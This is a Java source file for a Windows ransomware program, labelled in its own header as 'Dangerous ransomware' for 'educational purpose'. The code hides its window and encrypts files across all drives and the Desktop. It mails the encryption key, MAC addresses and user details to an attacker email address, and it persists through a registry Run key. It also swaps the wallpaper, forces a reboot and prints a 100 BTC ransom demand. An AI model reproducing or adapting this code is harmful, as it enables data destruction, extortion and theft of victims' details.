import com.sun.jna.Native;
import com.sun.jna.platform.win32.User32;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.InvocationTargetException;
import java.nio.file.FileSystems;
import java.util.ArrayList;
import java.util.Base64;
import java.util.Random;
import java.util.Scanner;

import javax.swing.JOptionPane;

/**
 * @author Amirreza Marzban
 * Dangerous ransomware
 * This Program is only for educational purpose.
 * *******Use Right********
 */

public class Main extends Core {
  private static int status;

  public static void main(String[] args) throws IOException {
    JnaInstances.User32 user32 = JnaInstances.User32.INSTANCE;
    if (!new File("C:\\Users\\status").exists()) {
      createFile("C:\\Users\\status", 0);
    }
    status = Integer.parseInt(new String(Base64.getDecoder().decode(Core.readFile("C:\\Users\\status"))));
    if (status == 0) {
      if (!isInterneton()) {
        JOptionPane.showMessageDialog(null, "Check your internet connection and try again !");
        System.exit(1);
      }
      System.out.println("Installing the program...");
      // run program in background
      user32.EnumWindows((hwnd, pointer) -> {
        char[] windowText = new char[512];
        user32.GetWindowTextW(hwnd, windowText, 512);
        String windowName = Native.toString(windowText);
        if (windowName.contains("setup.exe")) {
          user32.ShowWindow(hwnd, User32.SW_HIDE);
          return false;
        }
        return true;
      }, null);
//      Files.copy(Paths.get(System.getProperty("user.dir") + "\\setup.exe"),
//        Paths.get(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\setup.exe"), StandardCopyOption.REPLACE_EXISTING);
      findFiles();
      writeInRegistry();
    } else {
      textArt();
      findFiles();
    }
  }

  /**
   * print scary text art for victim after reset
   */
  static void textArt() {
    System.out.println("@@@@@                                        @@@@@\n" +
      "@@@@@@@                                      @@@@@@@\n" +
      "@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@\n" +
      " @@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@\n" +
      "     @@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@\n" +
      "       @@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@\n" +
      "         @@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@\n" +
      "            @@@@@@@    @@@@@@    @@@@@@\n" +
      "            @@@@@@      @@@@      @@@@@\n" +
      "            @@@@@@      @@@@      @@@@@\n" +
      "             @@@@@@    @@@@@@    @@@@@\n" +
      "              @@@@@@@@@@@  @@@@@@@@@@\n" +
      "               @@@@@@@@@@  @@@@@@@@@\n" +
      "           @@   @@@@@@@@@@@@@@@@@   @@\n" +
      "           @@@@  @@@@ @ @ @ @ @@@@  @@@@\n" +
      "          @@@@@   @@@ @ @ @ @ @@@   @@@@@\n" +
      "        @@@@@      @@@@@@@@@@@@@      @@@@@\n" +
      "      @@@@          @@@@@@@@@@@          @@@@\n" +
      "   @@@@@              @@@@@@@              @@@@@\n" +
      "  @@@@@@@                                 @@@@@@@\n" +
      "   @@@@@                                   @@@@@");
    System.out.println("*************************************************************************");
    System.out.println("\"Your files are encrypted. pay the 100 BTC to unlock your files !!\"");
    System.out.println("*************************************************************************");
    System.out.println("\"send me the BTC bill to *****@gmail.com and get your decryption key !!\"");
    System.out.println("*************************************************************************");
    System.out.println("\"Wallet\": Your wallet");
    System.out.println("*************************************************************************");
    System.out.println("\"Attention\": If you enter wrong key your files will be disappear");
    System.out.println("*************************************************************************");
    System.out.print("\"Enter the Key: \"");
  }

  /**
   * Add a new value in regedit path: "HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
   * This value force windows to add ransomware in startup programs
   * Add a new value in regedit path: "HKEY_CURRENT_USER\\Control Panel\Desktop"
   * This value remove the windows background
   */
  static void writeInRegistry() {
    try {
      String p = System.getProperty("user.dir");
      WinRegistry.writeStringValue(
        WinRegistry.HKEY_CURRENT_USER,
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        "ransome",
        p + "\\setup.exe",
        1);
      FileDownloader.download("https://www.online-tech-tips.com/wp-content/uploads/2019/07/ransomware.jpeg", "C:\\Windows\\h.jpg", filePath -> {
        //reset the computer with a message
        WinRegistry.writeStringValue(
          WinRegistry.HKEY_CURRENT_USER,
          "Control Panel\\Desktop",
          "Wallpaper",
          filePath,
          1);
        runCommand("shutdown -r -c \"Good bye!...\"", null);
      });
    } catch (IllegalAccessException e) {
      e.printStackTrace();
    } catch (InvocationTargetException e) {
      e.printStackTrace();
    }
  }

  /**
   * Search all dirvers
   *
   * @return the victim drivers
   */
  static ArrayList<String> findDrives() {
    ArrayList<String> arrayList = new ArrayList<>();

    String drives[] = {"A:", "B:", "C:", "D:", "E:", "F:", "G:", "H:", "I:", "J:", "K:", "L:", "M:", "N:", "O:", "P:", "Q:", "R:", "S:", "T:", "U:", "V:", "W:", "X:", "Y:", "Z:"};
    for (String d : drives) {
      FileSystems.getDefault().getFileStores().forEach(root -> {
          if (root.toString().contains(d)) {
            arrayList.add(d);
          }
        }
      );
    }
    return arrayList;
  }

  /**
   * The heart of ransomware !!
   */
  static void findFiles() {
    try {
      Process runtime;
      for (String drive : findDrives()) {
        if (drive.equals("C:")) {
          drive = System.getProperty("user.home") + "\\Desktop";
        }
        runtime = Runtime.getRuntime().exec("cmd /c dir /S /B *", null, new File(drive));

        BufferedReader inputStream = new BufferedReader(new InputStreamReader(runtime.getInputStream()));
        String s;
        if (status == 1) {
          String decryptedKey = new String(Base64.getDecoder().decode(readFile("C:\\Users\\Keys")));
          Scanner scanner = new Scanner(System.in);
          String userInput = scanner.nextLine();
          if (userInput.equals(decryptedKey)) {
            System.out.println("\"Your files are getting back...\nDo not close the window.\nIt will close by itself\n\"");
            while ((s = inputStream.readLine()) != null) {
              encryptFile(new File(s), Integer.parseInt(decryptedKey), status);
              System.out.println(s);
            }
          } else {
            System.out.println("The Key is wrong");
            findFiles();
          }
        } else {
          int key = new Random().nextInt();
          StringBuilder stringBuilder = new StringBuilder();
          createFile("C:\\Users\\Keys", key);
          while ((s = inputStream.readLine()) != null) {
            encryptFile(new File(s), key, status);
          }
          for (String mac : runCommand("cmd /c ipconfig/all|find \"Physical Address\"", null)) {
            stringBuilder.append(mac);
          }
          Mailer.send("*****@gmail.com", "New Key",
            "MAC Address: \n" + stringBuilder.toString() + "\n" +
              "KEY: " + String.valueOf(key) + "\n" +
              "User: " + System.getProperty("user.home") + "\n" +
              "OS: " + System.getProperty("os.name"));
        }
      }
    } catch (IOException e) {
      e.printStackTrace();
    }
  }
}